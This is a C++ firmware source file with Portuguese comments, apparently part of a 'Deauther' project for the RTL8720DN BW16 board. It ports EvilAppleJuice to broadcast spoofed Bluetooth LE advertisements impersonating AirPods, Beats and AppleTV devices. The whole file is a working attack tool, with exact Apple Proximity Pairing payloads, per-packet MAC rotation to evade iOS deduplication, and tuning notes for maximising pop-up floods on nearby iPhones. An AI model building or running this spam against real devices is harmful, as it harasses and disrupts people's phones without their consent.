#line 1 "C:\\Users\\R4bb1t\\Downloads\\RTL870dn-r4bb1t-havoc-main\\RTL870dn-r4bb1t-havoc-main\\RTL8720dn-Deauther\\ble_spam.cpp"
// =========================================================
// BLE Spam – Port of EvilAppleJuice-ESP32 para RTL8720DN BW16
// Original: github.com/EvilAppleJuice-ESP32
//
// Adaptações para Ameba SDK (BLEDevice.h v3.1.9):
//  - Objeto global é BLE (extern BLEDevice BLE), não BLEDevice::xxx
//  - BLEAdvert::setAdvData(uint8_t*, uint8_t) aceita buffer raw
//  - MAC aleatório via le_set_rand_addr() + GAP_PARAM_ADV_LOCAL_ADDR_TYPE
//  - Reconfiguração só com o advertising em GAP_ADV_STATE_IDLE
//  - PDU fixo ADV_NONCONN_IND (não conectável)
// =========================================================

// STL primeiro para evitar conflito com macros do Ameba
#undef max
#include <vector>

#include "ble_spam.h"
#include "debug.h"

// =========================================================
// Ajustes de compatibilidade com o RTL8720DN (BW16)
//
// ROTATE_MAC = 1: troca o endereço aleatório a cada pacote (como o
// EvilAppleJuice do ESP32). Isso é o que permite popups repetidos no modo
// FOCUSED (só AirPods). Se o seu módulo/iPhone não mostrar NADA, troque para 0:
// o advertising passa a usar o MAC público fixo do chip, exatamente como na
// implementação BLE-spam-BW16 que é conhecida por funcionar.
//
// ADV_TYPE: usamos sempre ADV_NONCONN_IND (não conectável). EVITAR ADV_IND,
// pois o iPhone pode tentar conectar e derrubar o advertising.
// =========================================================
#ifndef BLE_SPAM_ROTATE_MAC
#define BLE_SPAM_ROTATE_MAC 1
#endif

extern "C" {
#include "gap.h"
#include "gap_adv.h"
#include "gap_le.h"
#include "gap_le_types.h"
#include "gap_msg.h"
}

// =========================================================
// Tabela de dispositivos Apple (port direto de devices.hpp)
// =========================================================
const AppleDevice ALL_APPLE_DEVICES[] = {
  // ---- Audio (APPLE_AUDIO): payload 31 bytes, modelId no byte 7 ----
  {"Airpods",                0x02, APPLE_AUDIO},
  {"Power Beats",            0x03, APPLE_AUDIO},
  {"Beats X",                0x05, APPLE_AUDIO},
  {"Beats Solo 3",           0x06, APPLE_AUDIO},
  {"Beats Studio 3",         0x09, APPLE_AUDIO},
  {"Airpods Max",            0x0a, APPLE_AUDIO},
  {"Power Beats Pro",        0x0b, APPLE_AUDIO},
  {"Beats Solo Pro",         0x0c, APPLE_AUDIO},
  {"Airpods Pro",            0x0e, APPLE_AUDIO},
  {"Airpods Gen 2",          0x0f, APPLE_AUDIO},
  {"Beats Flex",             0x10, APPLE_AUDIO},
  {"Beats Studio Buds",      0x11, APPLE_AUDIO},
  {"Beats Fit Pro",          0x12, APPLE_AUDIO},
  {"Airpods Gen 3",          0x13, APPLE_AUDIO},
  {"Airpods Pro Gen 2",      0x14, APPLE_AUDIO},
  {"Beats Studio Buds+",     0x16, APPLE_AUDIO},
  {"Beats Studio Pro",       0x17, APPLE_AUDIO},
  {"Airpods Pro G2 USB-C",   0x24, APPLE_AUDIO},
  {"Beats Solo 4",           0x25, APPLE_AUDIO},
  {"Beats Solo Buds",        0x26, APPLE_AUDIO},
  {"Software Update",        0x2e, APPLE_AUDIO},
  {"Powerbeats Fit",         0x2f, APPLE_AUDIO},
  // ---- Setup (APPLE_SETUP): payload 23 bytes, modelId no byte 13 ----
  {"AppleTV Setup",          0x01, APPLE_SETUP},
  {"Transfer Number",        0x02, APPLE_SETUP},
  {"AppleTV Pair",           0x06, APPLE_SETUP},
  {"Setup New Phone",        0x09, APPLE_SETUP},
  {"Homepod Setup",          0x0b, APPLE_SETUP},
  {"AppleTV Homekit",        0x0d, APPLE_SETUP},
  {"AppleTV Keyboard",       0x13, APPLE_SETUP},
  {"TV Color Balance",       0x1e, APPLE_SETUP},
  {"AppleTV New User",       0x20, APPLE_SETUP},
  {"Vision Pro",             0x24, APPLE_SETUP},
  {"AppleTV Conn Net",       0x27, APPLE_SETUP},
  {"AppleTV AppleID",        0x2b, APPLE_SETUP},
  {"AppleTV Audio Sync",     0xc0, APPLE_SETUP},
};

// =========================================================
// generateApplePacket – port de devices.cpp::generatePacket
//
// Retorna um buffer ADV record completo (já com length + type + OUI):
//  APPLE_AUDIO → 31 bytes: [0x1e][0xff][0x4c][0x00][0x07][0x19][0x07][modelId][body×11]
//  APPLE_SETUP → 23 bytes: [0x16][0xff][0x4c][0x00][prefix×9][modelId][suffix×9]
// =========================================================
static uint8_t generateApplePacket(const AppleDevice& dev, uint8_t* buf) {
  memset(buf, 0, 31);

  if (dev.type == APPLE_AUDIO) {
    // Payload EXATO do EvilAppleJuice-ESP32 (src/devices.cpp).
    // ATENÇÃO: o corpo NÃO pode ser randomizado. iOS valida a estrutura do
    // "Proximity Pairing" e descarta o pacote se 0x75 / 0x30 / 0x45 forem
    // alterados — era exatamente esse o bug que impedia os popups.
    static const uint8_t header[7] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07};
    static const uint8_t body[11] = {0x20, 0x75, 0xaa, 0x30, 0x01,
                                     0x00, 0x00, 0x45, 0x12, 0x12, 0x12};
    memcpy(buf, header, sizeof(header));
    buf[7] = dev.modelId;          // Model ID
    memcpy(buf + 8, body, sizeof(body));
    // bytes 19..30 = 0x00 (já zerados pelo memset)
    return 31;
  } else {
    // APPLE_SETUP — 23 bytes (mantido igual, já funcionava)
    const uint8_t prefix[] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1};
    const uint8_t suffix[] = {0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
    memcpy(buf, prefix, 13);
    buf[13] = dev.modelId;
    memcpy(buf + 14, suffix, 9);
    return 23; // Total length: 1 AD len + 22 data bytes
  }
}

// =========================================================
// Runtime state
// =========================================================
bool     isBleSpamming = false;
uint32_t ble_pkt_sent  = 0;
uint8_t  ble_spam_idx  = 0;
bool     ble_focused_mode = false; // false=ALL(22 devices), true=FOCUSED(AirPods only)

static bool ble_initialized = false;   // spam ativo (advertising rodando)
static bool ble_stack_ready = false;   // stack BLE/GAP inicializado
static uint32_t ble_last_tx_ms = 0;    // diagnóstico de cadência
static bool ble_rand_addr_broken = false; // controller recusou endereço aleatório

// =========================================================
// Helpers de advertising (SDK Ameba)
// =========================================================

// Espera o GAP confirmar que o advertising parou (gap_adv_state == IDLE).
// CRITICO: o SDK só aceita alteração de parâmetros de advertising quando o
// estado é IDLE. Se chamarmos le_adv_set_param()/le_set_rand_addr() enquanto
// o stop ainda está pendente, o stack ignora tudo silenciosamente.
static bool adv_wait_idle(uint32_t timeout_ms) {
  uint32_t start = millis();
  T_GAP_DEV_STATE st;
  while (millis() - start < timeout_ms) {
    if (le_get_gap_param(GAP_PARAM_DEV_STATE, &st) == GAP_CAUSE_SUCCESS) {
      if (st.gap_init_state != GAP_INIT_STATE_STACK_READY) return false;
      if (st.gap_adv_state == GAP_ADV_STATE_IDLE) return true;
    }
    delay(2);
  }
  return false;
}

// Gera e aplica um novo endereço aleatório (identidade nova para o iOS).
// Retorna o tipo de endereço a usar no advertising; se o controller recusar,
// cai para o endereço público do chip em vez de simplesmente não anunciar.
static uint8_t adv_set_new_random_addr() {
  if (!BLE_SPAM_ROTATE_MAC || ble_rand_addr_broken) {
    return GAP_LOCAL_ADDR_LE_PUBLIC;
  }

  uint8_t mac[6];
  for (int i = 0; i < 6; i++) mac[i] = (uint8_t)random(256);

  // Static Random Address (BT Core 5.0): bits 7:6 do octeto MAIS significativo
  // devem ser 11. O array do SDK é little-endian, então o MSB é mac[5].
  mac[5] = (uint8_t)((mac[5] & 0x3F) | 0xC0);

  T_GAP_CAUSE cause = le_set_rand_addr(mac);
  if (cause != GAP_CAUSE_SUCCESS) {
    // Fallback: pede ao controller para gerar um endereço estático válido.
    if (le_gen_rand_addr(GAP_RAND_ADDR_STATIC, mac) == GAP_CAUSE_SUCCESS) {
      cause = le_set_rand_addr(mac);
    }
  }

  if (cause != GAP_CAUSE_SUCCESS) {
    ble_rand_addr_broken = true; // não insiste a cada ciclo
    DEBUG_SER_PRINT("[BLE] le_set_rand_addr falhou (cause=0x");
    DEBUG_SER_PRINT((int)cause, HEX);
    DEBUG_SER_PRINT(") -> usando endereco publico fixo\n");
    return GAP_LOCAL_ADDR_LE_PUBLIC;
  }
  return GAP_LOCAL_ADDR_LE_RANDOM;
}

// =========================================================
// ble_spam_next – avança para o próximo dispositivo e transmite
// =========================================================
void ble_spam_next() {
  if (!ble_initialized || !ble_stack_ready) return;

  if (ble_focused_mode) {
    // MODO FOCUSED: só AirPods (idx=0) com MAC novo a cada ciclo.
    // Replica o modo default do EvilAppleJuice original (LEFT_OFF_RIGHT_OFF).
    // iOS precisa ver o mesmo device ID repetidas vezes para exibir o popup —
    // concentrar em AirPods maximiza a taxa de notificações.
    ble_spam_idx = 0; // AIRPODS fixo
  } else {
    // MODO ALL: cicla pelos 22 dispositivos APPLE_AUDIO
    do {
      ble_spam_idx = (ble_spam_idx + 1) % (uint8_t)NUM_APPLE_DEVICES;
    } while (ALL_APPLE_DEVICES[ble_spam_idx].type != APPLE_AUDIO);
  }

  const AppleDevice& dev = ALL_APPLE_DEVICES[ble_spam_idx];

  // Constrói o payload Apple (AD record raw)
  uint8_t packet[31];
  uint8_t pktLen = generateApplePacket(dev, packet);

  BLEAdvert* advert = BLE.configAdvert();

  // 1) Para o advertising e espera o stack confirmar IDLE antes de reconfigurar.
  le_adv_stop();
  if (!adv_wait_idle(200)) {
    DEBUG_SER_PRINT("[BLE] AVISO: adv nao ficou IDLE, reconfigurando mesmo assim.\n");
  }

  // 2) Novo Random MAC — acessórios Apple reais usam endereço privado aleatório.
  // Sem isso o iOS deduplica e ignora pacotes do mesmo MAC.
  uint8_t adv_addr_type = GAP_LOCAL_ADDR_LE_PUBLIC;
  if (BLE_SPAM_ROTATE_MAC) {
    adv_addr_type = adv_set_new_random_addr();
  }
  le_adv_set_param(GAP_PARAM_ADV_LOCAL_ADDR_TYPE, sizeof(adv_addr_type), &adv_addr_type);

  // 3) ADV sempre não-conectável (mesma escolha da implementação BW16 que
  // funciona). ADV_IND/SCAN_IND fazem o iPhone tentar conectar e interromper
  // o advertising.
  advert->setAdvType(GAP_ADTYPE_ADV_NONCONN_IND);
  advert->setMinInterval(20); // 20ms — Apple recomenda para maxima descoberta (QA1931)
  advert->setMaxInterval(20);
  advert->setAdvData(packet, pktLen);
  advert->updateAdvertParams();

  // 4) Inicia e verifica o resultado (antes era ignorado).
  T_GAP_CAUSE cause = le_adv_start();
  if (cause != GAP_CAUSE_SUCCESS) {
    DEBUG_SER_PRINT("[BLE] le_adv_start falhou (cause=0x");
    DEBUG_SER_PRINT((int)cause, HEX);
    DEBUG_SER_PRINT(")\n");
    return;
  }

  ble_pkt_sent++;

  DEBUG_SER_PRINT("[BLE] TX: ");
  DEBUG_SER_PRINT(dev.name);
  DEBUG_SER_PRINT(" id=0x");
  DEBUG_SER_PRINT(dev.modelId, HEX);
  DEBUG_SER_PRINT(" len=");
  DEBUG_SER_PRINT((int)pktLen);
  DEBUG_SER_PRINT(" desde ");
  DEBUG_SER_PRINT((int)(millis() - ble_last_tx_ms));
  DEBUG_SER_PRINT("ms\n");
  ble_last_tx_ms = millis();
}

// =========================================================
// start_ble_spam
// =========================================================
void start_ble_spam() {
  if (ble_initialized) return;

  DEBUG_SER_PRINT(ble_focused_mode ? "[BLE] Modo FOCUSED: AirPods spam continuo\n"
                                   : "[BLE] Modo ALL: 22 dispositivos AUDIO\n");

  if (!ble_stack_ready) {
    BLE.init();

    // Configura parâmetros base ANTES de subir o stack: quando o GAP fica
    // pronto o callback do SDK chama le_adv_start() automaticamente, então o
    // primeiro advertising já precisa ter um payload Apple válido.
    BLEAdvert* advert = BLE.configAdvert();
    advert->setAdvType(GAP_ADTYPE_ADV_NONCONN_IND);
    advert->setMinInterval(20);
    advert->setMaxInterval(20);

    uint8_t first[31];
    uint8_t firstLen = generateApplePacket(ALL_APPLE_DEVICES[AIRPODS], first);
    advert->setAdvData(first, firstLen);
    advert->updateAdvertParams();

    DEBUG_SER_PRINT("[BLE] Inicializando stack BLE (aguarde)...\n");
    BLE.beginPeripheral();   // aguarda GAP_INIT_STATE_STACK_READY
    ble_stack_ready = true;
    DEBUG_SER_PRINT("[BLE] Stack BLE pronto.\n");
  }

  ble_initialized = true;
  isBleSpamming   = true;
  ble_pkt_sent    = 0;
  ble_rand_addr_broken = false; // tenta endereço aleatório novamente
  ble_spam_idx    = (uint8_t)(NUM_APPLE_DEVICES - 1); // next() vai para AIRPODS (idx=0, primeiro AUDIO)

  DEBUG_SER_PRINT("[BLE] Pronto. Iniciando broadcast...\n");
  ble_spam_next(); // primeiro pacote imediato
}

// =========================================================
// stop_ble_spam
// =========================================================
void stop_ble_spam() {
  isBleSpamming = false;
  if (ble_initialized) {
    le_adv_stop();
    adv_wait_idle(100);
    ble_initialized = false;
    DEBUG_SER_PRINT("[BLE] BLE spam parado.\n");
  }

  // NÃO chamamos BLE.end(): o stack da Ameba não reinicializa de forma
  // confiável e um segundo start() podia travar o firmware. O stack fica
  // pronto e apenas o advertising é interrompido.
}